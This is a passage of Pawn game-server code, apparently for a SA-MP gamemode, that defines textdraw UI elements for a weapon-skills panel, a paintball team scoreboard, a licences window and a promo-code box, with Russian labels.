	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[17], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[17], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[17], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[17], 0);

	TDEditor_SKILL_GLOBAL[18] = TextDrawCreate(289.806640, 240.262176, "ak47");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[18], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[18], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[18], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[18], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[18], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[18], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[18], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[18], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[18], 0);

	TDEditor_SKILL_GLOBAL[19] = TextDrawCreate(360.010925, 240.262176, "m4");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[19], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[19], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[19], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[19], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[19], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[19], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[19], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[19], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[19], 0);

	TDEditor_SKILL_GLOBAL[20] = TextDrawCreate(398.411102, 177.087432, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[20], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[20], 461.911102, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[20], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[20], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[20], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[20], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[20], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[20], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[20], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[20], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[20], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[20], 0);

	TDEditor_SKILL_GLOBAL[21] = TextDrawCreate(398.411102, 231.890777, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[21], 0.000000, 5.500000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[21], 461.911102, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[21], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[21], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[21], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[21], 882573055);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[21], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[21], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[21], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[21], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[21], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[21], 0);

	TDEditor_SKILL_GLOBAL[22] = TextDrawCreate(399.200408, 177.887908, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[22], 0.000000, 5.284018);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[22], 460.650634, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[22], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[22], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[22], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[22], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[22], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[22], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[22], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[22], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[22], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[22], 0);

	TDEditor_SKILL_GLOBAL[23] = TextDrawCreate(399.200408, 232.991271, "box");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[23], 0.000000, 5.284018);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[23], 460.650634, 0.000000);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[23], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[23], -1);
	TextDrawUseBox(TDEditor_SKILL_GLOBAL[23], 1);
	TextDrawBoxColor(TDEditor_SKILL_GLOBAL[23], 356609791);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[23], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[23], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[23], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[23], 1);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[23], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[23], 0);

	TDEditor_SKILL_GLOBAL[24] = TextDrawCreate(185.099914, 285.600067, "LD_SPAC:WHITE");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[24], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[24], 138.260406, 14.599945);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[24], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[24], 425103359);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[24], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[24], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[24], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[24], 4);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[24], 0);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[24], 0);
	TextDrawSetSelectable(TDEditor_SKILL_GLOBAL[24], true);

	TDEditor_SKILL_GLOBAL[25] = TextDrawCreate(326.099731, 285.612701, "LD_SPAC:WHITE");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[25], 0.000000, 0.000000);
	TextDrawTextSize(TDEditor_SKILL_GLOBAL[25], 137.750686, 14.599945);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[25], 1);
	TextDrawColor(TDEditor_SKILL_GLOBAL[25], 425103359);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[25], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[25], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[25], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[25], 4);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[25], 0);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[25], 0);
	TextDrawSetSelectable(TDEditor_SKILL_GLOBAL[25], true);

	TDEditor_SKILL_GLOBAL[26] = TextDrawCreate(322.900024, 161.562500, "навыки_владения_оружием");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[26], 0.185498, 1.000625);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[26], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[26], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[26], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[26], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[26], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[26], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[26], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[26], 0);

	TDEditor_SKILL_GLOBAL[27] = TextDrawCreate(430.006500, 185.274658, "pistol");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[27], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[27], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[27], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[27], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[27], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[27], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[27], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[27], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[27], 0);

	TDEditor_SKILL_GLOBAL[28] = TextDrawCreate(429.915191, 240.062164, "microuzi");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[28], 0.188997, 1.434375);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[28], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[28], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[28], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[28], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[28], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[28], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[28], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[28], 0);

	TDEditor_SKILL_GLOBAL[29] = TextDrawCreate(255.899993, 286.087677, "назад_к_главному_меню");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[29], 0.201000, 1.355624);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[29], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[29], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[29], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[29], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[29], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[29], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[29], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[29], 0);

	TDEditor_SKILL_GLOBAL[30] = TextDrawCreate(395.605346, 285.912719, "выход");
	TextDrawLetterSize(TDEditor_SKILL_GLOBAL[30], 0.201000, 1.355624);
	TextDrawAlignment(TDEditor_SKILL_GLOBAL[30], 2);
	TextDrawColor(TDEditor_SKILL_GLOBAL[30], -1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[30], 0);
	TextDrawSetOutline(TDEditor_SKILL_GLOBAL[30], 0);
	TextDrawBackgroundColor(TDEditor_SKILL_GLOBAL[30], 255);
	TextDrawFont(TDEditor_SKILL_GLOBAL[30], 2);
	TextDrawSetProportional(TDEditor_SKILL_GLOBAL[30], 1);
	TextDrawSetShadow(TDEditor_SKILL_GLOBAL[30], 0);
}

stock LoadTextDrawsTuning()
{

}

stock LoadTextDrawsMainMenu()
{
	paintball_td[0] = TextDrawCreate(172.000000, 2.312500, "LD_SPAC:white");
	TextDrawLetterSize(paintball_td[0], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[0], 157.000000, 18.000000);
	TextDrawAlignment(paintball_td[0], 1);
	TextDrawColor(paintball_td[0], 386400767);
	TextDrawSetShadow(paintball_td[0], 0);
	TextDrawSetOutline(paintball_td[0], 0);
	TextDrawBackgroundColor(paintball_td[0], 255);
	TextDrawFont(paintball_td[0], 4);
	TextDrawSetProportional(paintball_td[0], 0);
	TextDrawSetShadow(paintball_td[0], 0);

	paintball_td[1] = TextDrawCreate(329.899963, 2.350000, "LD_SPAC:white");
	TextDrawLetterSize(paintball_td[1], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[1], 157.000000, 18.000000);
	TextDrawAlignment(paintball_td[1], 1);
	TextDrawColor(paintball_td[1], 386400767);
	TextDrawSetShadow(paintball_td[1], 0);
	TextDrawSetOutline(paintball_td[1], 0);
	TextDrawBackgroundColor(paintball_td[1], 255);
	TextDrawFont(paintball_td[1], 4);
	TextDrawSetProportional(paintball_td[1], 0);
	TextDrawSetShadow(paintball_td[1], 0);

	paintball_td[2] = TextDrawCreate(173.299957, 3.862500, "LD_SPAC:white");
	TextDrawLetterSize(paintball_td[2], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[2], 30.000000, 15.000000);
	TextDrawAlignment(paintball_td[2], 1);
	TextDrawColor(paintball_td[2], -1282407681);
	TextDrawSetShadow(paintball_td[2], 0);
	TextDrawSetOutline(paintball_td[2], 0);
	TextDrawBackgroundColor(paintball_td[2], 255);
	TextDrawFont(paintball_td[2], 4);
	TextDrawSetProportional(paintball_td[2], 0);
	TextDrawSetShadow(paintball_td[2], 0);

	paintball_td[3] = TextDrawCreate(174.500000, 4.500000, "LD_SPAC:white");
	TextDrawLetterSize(paintball_td[3], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[3], 28.000000, 13.779994);
	TextDrawAlignment(paintball_td[3], 1);
	TextDrawColor(paintball_td[3], 386400767);
	TextDrawSetShadow(paintball_td[3], 0);
	TextDrawSetOutline(paintball_td[3], 0);
	TextDrawBackgroundColor(paintball_td[3], 255);
	TextDrawFont(paintball_td[3], 4);
	TextDrawSetProportional(paintball_td[3], 0);
	TextDrawSetShadow(paintball_td[3], 0);

	paintball_td[4] = TextDrawCreate(455.399871, 3.862499, "LD_SPAC:white");
	TextDrawLetterSize(paintball_td[4], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[4], 30.000000, 15.000000);
	TextDrawAlignment(paintball_td[4], 1);
	TextDrawColor(paintball_td[4], -1282407681);
	TextDrawSetShadow(paintball_td[4], 0);
	TextDrawSetOutline(paintball_td[4], 0);
	TextDrawBackgroundColor(paintball_td[4], 255);
	TextDrawFont(paintball_td[4], 4);
	TextDrawSetProportional(paintball_td[4], 0);
	TextDrawSetShadow(paintball_td[4], 0);

	paintball_td[5] = TextDrawCreate(456.399871, 4.587498, "LD_SPAC:white");
	TextDrawLetterSize(paintball_td[5], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[5], 28.000000, 13.779994);
	TextDrawAlignment(paintball_td[5], 1);
	TextDrawColor(paintball_td[5], 386400767);
	TextDrawSetShadow(paintball_td[5], 0);
	TextDrawSetOutline(paintball_td[5], 0);
	TextDrawBackgroundColor(paintball_td[5], 255);
	TextDrawFont(paintball_td[5], 4);
	TextDrawSetProportional(paintball_td[5], 0);
	TextDrawSetShadow(paintball_td[5], 0);

	paintball_td[6] = TextDrawCreate(266.392181, 4.675001, "спецназ");
	TextDrawLetterSize(paintball_td[6], 0.250499, 1.332499);
	TextDrawAlignment(paintball_td[6], 2);
	TextDrawColor(paintball_td[6], -1);
	TextDrawSetShadow(paintball_td[6], 0);
	TextDrawSetOutline(paintball_td[6], 0);
	TextDrawBackgroundColor(paintball_td[6], 255);
	TextDrawFont(paintball_td[6], 2);
	TextDrawSetProportional(paintball_td[6], 1);
	TextDrawSetShadow(paintball_td[6], 0);

	paintball_td[7] = TextDrawCreate(392.499877, 4.875001, "террористы");
	TextDrawLetterSize(paintball_td[7], 0.250499, 1.332499);
	TextDrawAlignment(paintball_td[7], 2);
	TextDrawColor(paintball_td[7], -1);
	TextDrawSetShadow(paintball_td[7], 0);
	TextDrawSetOutline(paintball_td[7], 0);
	TextDrawBackgroundColor(paintball_td[7], 255);
	TextDrawFont(paintball_td[7], 2);
	TextDrawSetProportional(paintball_td[7], 1);
	TextDrawSetShadow(paintball_td[7], 0);

	paintball_td[8] = TextDrawCreate(188.600158, 3.975001, "533");
	TextDrawLetterSize(paintball_td[8], 0.399499, 1.494999);
	TextDrawAlignment(paintball_td[8], 2);
	TextDrawColor(paintball_td[8], -1);
	TextDrawSetShadow(paintball_td[8], 0);
	TextDrawSetOutline(paintball_td[8], 0);
	TextDrawBackgroundColor(paintball_td[8], 255);
	TextDrawFont(paintball_td[8], 1);
	TextDrawSetProportional(paintball_td[8], 1);
	TextDrawSetShadow(paintball_td[8], 0);

	paintball_td[9] = TextDrawCreate(471.100158, 3.975002, "103");
	TextDrawLetterSize(paintball_td[9], 0.399499, 1.494999);
	TextDrawAlignment(paintball_td[9], 2);
	TextDrawColor(paintball_td[9], -1);
	TextDrawSetShadow(paintball_td[9], 0);
	TextDrawSetOutline(paintball_td[9], 0);
	TextDrawBackgroundColor(paintball_td[9], 255);
	TextDrawFont(paintball_td[9], 1);
	TextDrawSetProportional(paintball_td[9], 1);
	TextDrawSetShadow(paintball_td[9], 0);

	paintball_td[10] = TextDrawCreate(443.899871, 3.862499, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[10], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[10], 3.360000, 3.070000);
	TextDrawAlignment(paintball_td[10], 1);
	TextDrawColor(paintball_td[10], -1282407681);
	TextDrawSetShadow(paintball_td[10], 0);
	TextDrawSetOutline(paintball_td[10], 0);
	TextDrawBackgroundColor(paintball_td[10], 255);
	TextDrawFont(paintball_td[10], 4);
	TextDrawSetProportional(paintball_td[10], 0);
	TextDrawSetShadow(paintball_td[10], 0);

	paintball_td[11] = TextDrawCreate(392.399871, 15.674999, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[11], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[11], 3.360000, 3.070000);
	TextDrawAlignment(paintball_td[11], 1);
	TextDrawColor(paintball_td[11], -1282407681);
	TextDrawSetShadow(paintball_td[11], 0);
	TextDrawSetOutline(paintball_td[11], 0);
	TextDrawBackgroundColor(paintball_td[11], 255);
	TextDrawFont(paintball_td[11], 4);
	TextDrawSetProportional(paintball_td[11], 0);
	TextDrawSetShadow(paintball_td[11], 0);

	paintball_td[12] = TextDrawCreate(331.899871, 4.812496, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[12], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[12], 3.360000, 3.070000);
	TextDrawAlignment(paintball_td[12], 1);
	TextDrawColor(paintball_td[12], -1282407681);
	TextDrawSetShadow(paintball_td[12], 0);
	TextDrawSetOutline(paintball_td[12], 0);
	TextDrawBackgroundColor(paintball_td[12], 255);
	TextDrawFont(paintball_td[12], 4);
	TextDrawSetProportional(paintball_td[12], 0);
	TextDrawSetShadow(paintball_td[12], 0);

	paintball_td[13] = TextDrawCreate(298.399871, 11.374996, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[13], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[13], 3.360000, 3.070000);
	TextDrawAlignment(paintball_td[13], 1);
	TextDrawColor(paintball_td[13], -1282407681);
	TextDrawSetShadow(paintball_td[13], 0);
	TextDrawSetOutline(paintball_td[13], 0);
	TextDrawBackgroundColor(paintball_td[13], 255);
	TextDrawFont(paintball_td[13], 4);
	TextDrawSetProportional(paintball_td[13], 0);
	TextDrawSetShadow(paintball_td[13], 0);

	paintball_td[14] = TextDrawCreate(239.899871, 15.749996, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[14], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[14], 3.360000, 3.070000);
	TextDrawAlignment(paintball_td[14], 1);
	TextDrawColor(paintball_td[14], -1282407681);
	TextDrawSetShadow(paintball_td[14], 0);
	TextDrawSetOutline(paintball_td[14], 0);
	TextDrawBackgroundColor(paintball_td[14], 255);
	TextDrawFont(paintball_td[14], 4);
	TextDrawSetProportional(paintball_td[14], 0);
	TextDrawSetShadow(paintball_td[14], 0);

	paintball_td[15] = TextDrawCreate(218.399871, 8.312496, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[15], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[15], 3.360000, 3.070000);
	TextDrawAlignment(paintball_td[15], 1);
	TextDrawColor(paintball_td[15], -1282407681);
	TextDrawSetShadow(paintball_td[15], 0);
	TextDrawSetOutline(paintball_td[15], 0);
	TextDrawBackgroundColor(paintball_td[15], 255);
	TextDrawFont(paintball_td[15], 4);
	TextDrawSetProportional(paintball_td[15], 0);
	TextDrawSetShadow(paintball_td[15], 0);

	paintball_td[16] = TextDrawCreate(231.399871, 4.374996, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[16], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[16], 2.600001, 2.010001);
	TextDrawAlignment(paintball_td[16], 1);
	TextDrawColor(paintball_td[16], -1282407681);
	TextDrawSetShadow(paintball_td[16], 0);
	TextDrawSetOutline(paintball_td[16], 0);
	TextDrawBackgroundColor(paintball_td[16], 255);
	TextDrawFont(paintball_td[16], 4);
	TextDrawSetProportional(paintball_td[16], 0);
	TextDrawSetShadow(paintball_td[16], 0);

	paintball_td[17] = TextDrawCreate(316.899871, 9.624996, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[17], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[17], 2.600001, 2.010001);
	TextDrawAlignment(paintball_td[17], 1);
	TextDrawColor(paintball_td[17], -1282407681);
	TextDrawSetShadow(paintball_td[17], 0);
	TextDrawSetOutline(paintball_td[17], 0);
	TextDrawBackgroundColor(paintball_td[17], 255);
	TextDrawFont(paintball_td[17], 4);
	TextDrawSetProportional(paintball_td[17], 0);
	TextDrawSetShadow(paintball_td[17], 0);

	paintball_td[18] = TextDrawCreate(340.399871, 13.562496, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[18], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[18], 2.600001, 2.010001);
	TextDrawAlignment(paintball_td[18], 1);
	TextDrawColor(paintball_td[18], -1282407681);
	TextDrawSetShadow(paintball_td[18], 0);
	TextDrawSetOutline(paintball_td[18], 0);
	TextDrawBackgroundColor(paintball_td[18], 255);
	TextDrawFont(paintball_td[18], 4);
	TextDrawSetProportional(paintball_td[18], 0);
	TextDrawSetShadow(paintball_td[18], 0);

	paintball_td[19] = TextDrawCreate(433.399871, 11.374996, "LD_BEAT:Chit");
	TextDrawLetterSize(paintball_td[19], 0.000000, 0.000000);
	TextDrawTextSize(paintball_td[19], 2.600001, 2.010001);
	TextDrawAlignment(paintball_td[19], 1);
	TextDrawColor(paintball_td[19], -1282407681);
	TextDrawSetShadow(paintball_td[19], 0);
	TextDrawSetOutline(paintball_td[19], 0);
	TextDrawBackgroundColor(paintball_td[19], 255);
	TextDrawFont(paintball_td[19], 4);
	TextDrawSetProportional(paintball_td[19], 0);
	TextDrawSetShadow(paintball_td[19], 0);

	TDEditor_LICGLOBAL[0] = TextDrawCreate(362.1521, 239.0348, "Box"); // пусто
	TextDrawLetterSize(TDEditor_LICGLOBAL[0], 0.0000, 7.1286);
	TextDrawTextSize(TDEditor_LICGLOBAL[0], 538.0000, 0.0000);
	TextDrawAlignment(TDEditor_LICGLOBAL[0], 1);
	TextDrawColor(TDEditor_LICGLOBAL[0], -1);
	TextDrawUseBox(TDEditor_LICGLOBAL[0], 1);
	TextDrawBoxColor(TDEditor_LICGLOBAL[0], 538845183);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[0], 255);
	TextDrawFont(TDEditor_LICGLOBAL[0], 1);
	TextDrawSetProportional(TDEditor_LICGLOBAL[0], 1);
	TextDrawSetShadow(TDEditor_LICGLOBAL[0], 0);

	TDEditor_LICGLOBAL[1] = TextDrawCreate(362.0205, 238.4165, "Box"); // пусто
	TextDrawLetterSize(TDEditor_LICGLOBAL[1], 0.0000, 0.5357);
	TextDrawTextSize(TDEditor_LICGLOBAL[1], 538.0000, 0.0000);
	TextDrawAlignment(TDEditor_LICGLOBAL[1], 1);
	TextDrawColor(TDEditor_LICGLOBAL[1], -1);
	TextDrawUseBox(TDEditor_LICGLOBAL[1], 1);
	TextDrawBoxColor(TDEditor_LICGLOBAL[1], 8125951);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[1], 255);
	TextDrawFont(TDEditor_LICGLOBAL[1], 1);
	TextDrawSetProportional(TDEditor_LICGLOBAL[1], 1);
	TextDrawSetShadow(TDEditor_LICGLOBAL[1], 0);

	TDEditor_LICGLOBAL[2] = TextDrawCreate(362.0205, 242.7335, "Box"); // пусто
	TextDrawLetterSize(TDEditor_LICGLOBAL[2], 0.0000, 0.0205);
	TextDrawTextSize(TDEditor_LICGLOBAL[2], 538.0000, 0.0000);
	TextDrawAlignment(TDEditor_LICGLOBAL[2], 1);
	TextDrawColor(TDEditor_LICGLOBAL[2], -1);
	TextDrawUseBox(TDEditor_LICGLOBAL[2], 1);
	TextDrawBoxColor(TDEditor_LICGLOBAL[2], 90439679);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[2], 255);
	TextDrawFont(TDEditor_LICGLOBAL[2], 1);
	TextDrawSetProportional(TDEditor_LICGLOBAL[2], 1);
	TextDrawSetShadow(TDEditor_LICGLOBAL[2], 0);

	TDEditor_LICGLOBAL[3] = TextDrawCreate(431.8801, 235.1513, "лицензии"); // пусто
	TextDrawLetterSize(TDEditor_LICGLOBAL[3], 0.1844, 1.0765);
	TextDrawAlignment(TDEditor_LICGLOBAL[3], 1);
	TextDrawColor(TDEditor_LICGLOBAL[3], -1);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[3], 255);
	TextDrawFont(TDEditor_LICGLOBAL[3], 2);
	TextDrawSetProportional(TDEditor_LICGLOBAL[3], 1);
	TextDrawSetShadow(TDEditor_LICGLOBAL[3], 0);

	TDEditor_LICGLOBAL[4] = TextDrawCreate(365.4320, 249.4998, "водительские_права:~n~лицензия_на_полеты:~n~лицензия_на_оружие:~n~лицензия_на_суходство:"); // пусто
	TextDrawLetterSize(TDEditor_LICGLOBAL[4], 0.1820, 0.9815);
	TextDrawAlignment(TDEditor_LICGLOBAL[4], 1);
	TextDrawColor(TDEditor_LICGLOBAL[4], -1);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[4], 255);
	TextDrawFont(TDEditor_LICGLOBAL[4], 2);
	TextDrawSetProportional(TDEditor_LICGLOBAL[4], 1);
	TextDrawSetShadow(TDEditor_LICGLOBAL[4], 0);

	TDEditor_LICGLOBAL[5] = TextDrawCreate(360.1098, 289.6665, "LD_SPAC:white"); // пусто
	TextDrawTextSize(TDEditor_LICGLOBAL[5], 180.0000, 16.0000);
	TextDrawAlignment(TDEditor_LICGLOBAL[5], 1);
	TextDrawColor(TDEditor_LICGLOBAL[5], 1076768511);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[5], 255);
	TextDrawFont(TDEditor_LICGLOBAL[5], 4);
	TextDrawSetProportional(TDEditor_LICGLOBAL[5], 0);
	TextDrawSetShadow(TDEditor_LICGLOBAL[5], 0);
	TextDrawSetSelectable(TDEditor_LICGLOBAL[5], true);

	TDEditor_LICGLOBAL[6] = TextDrawCreate(434.2803, 291.1546, "ЗАКРЫТЬ"); // пусто
	TextDrawLetterSize(TDEditor_LICGLOBAL[6], 0.1844, 1.0765);
	TextDrawAlignment(TDEditor_LICGLOBAL[6], 1);
	TextDrawColor(TDEditor_LICGLOBAL[6], -1);
	TextDrawBackgroundColor(TDEditor_LICGLOBAL[6], 255);
	TextDrawFont(TDEditor_LICGLOBAL[6], 2);
	TextDrawSetProportional(TDEditor_LICGLOBAL[6], 1);
	TextDrawSetShadow(TDEditor_LICGLOBAL[6], 0);

	TDEditor_PROMO[0] = TextDrawCreate(228.9712, 210.9998, "Box"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[0], 0.0000, 9.0916);
	TextDrawTextSize(TDEditor_PROMO[0], 423.0000, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[0], 1);
	TextDrawColor(TDEditor_PROMO[0], -1);
	TextDrawUseBox(TDEditor_PROMO[0], 1);
	TextDrawBoxColor(TDEditor_PROMO[0], 538845183);
	TextDrawBackgroundColor(TDEditor_PROMO[0], 255);
	TextDrawFont(TDEditor_PROMO[0], 1);
	TextDrawSetProportional(TDEditor_PROMO[0], 1);
	TextDrawSetShadow(TDEditor_PROMO[0], 0);

	TDEditor_PROMO[1] = TextDrawCreate(228.6918, 211.1513, "Box"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[1], 0.0000, 0.5446);
	TextDrawTextSize(TDEditor_PROMO[1], 422.7206, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[1], 1);
	TextDrawColor(TDEditor_PROMO[1], -1);
	TextDrawUseBox(TDEditor_PROMO[1], 1);
	TextDrawBoxColor(TDEditor_PROMO[1], -67239681);
	TextDrawBackgroundColor(TDEditor_PROMO[1], 255);
	TextDrawFont(TDEditor_PROMO[1], 1);
	TextDrawSetProportional(TDEditor_PROMO[1], 1);
	TextDrawSetShadow(TDEditor_PROMO[1], 0);

	TDEditor_PROMO[2] = TextDrawCreate(228.8603, 215.2843, "Box"); // пусто
	TextDrawLetterSize(TDEditor_PROMO[2], 0.0000, 0.0724);
	TextDrawTextSize(TDEditor_PROMO[2], 423.0000, 0.0000);
	TextDrawAlignment(TDEditor_PROMO[2], 1);
	TextDrawColor(TDEditor_PROMO[2], -1);
	TextDrawUseBox(TDEditor_PROMO[2], 1);
	TextDrawBoxColor(TDEditor_PROMO[2], -67239681);
	TextDrawBackgroundColor(TDEditor_PROMO[2], 255);
	TextDrawFont(TDEditor_PROMO[2], 1);
	TextDrawSetProportional(TDEditor_PROMO[2], 1);
	TextDrawSetShadow(TDEditor_PROMO[2], 0);

